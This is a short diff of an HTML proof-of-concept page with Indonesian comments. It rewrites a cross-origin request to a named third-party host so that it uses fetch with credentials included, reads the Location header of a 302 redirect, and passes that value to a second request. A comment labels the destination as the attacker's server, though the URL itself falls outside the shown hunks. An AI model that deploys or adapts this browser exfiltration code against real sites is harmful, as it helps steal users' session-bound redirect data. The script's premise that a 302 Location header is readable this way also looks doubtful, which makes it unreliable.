@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>POC - Ambil Header Location dengan XHR</title>
+    <title>POC - Ambil Header Location dengan Fetch</title>
 </head>
 <body>
-    <h1>POC - Ambil Header Location dengan XHR</h1>
+    <h1>POC - Ambil Header Location dengan Fetch</h1>
     <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://airflow.soundcloud.org', true);
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === XMLHttpRequest.HEADERS_RECEIVED) {
-                var locationHeader = xhr.getResponseHeader('Location');
+        fetch('https://airflow.soundcloud.org', {
+            method: 'GET',
+            credentials: 'include'
+        })
+        .then(response => {
+            if (response.status === 302) {
+                var locationHeader = response.headers.get('Location');
                 if (locationHeader) {
                     // Kirim lokasi ke server penyerang
                     var exfiltrateXhr = new XMLHttpRequest();
@@ -19,13 +21,11 @@
                 } else {
                     console.log("Header 'Location' tidak ditemukan.");
                 }
+            } else {
+                console.log("Response status bukan 302:", response.status);
             }
-        };
-        xhr.send();
+        })
+        .catch(error => console.log("Gagal mengambil link:", error));
     </script>
 </body>
 </html>
-
-
-
-
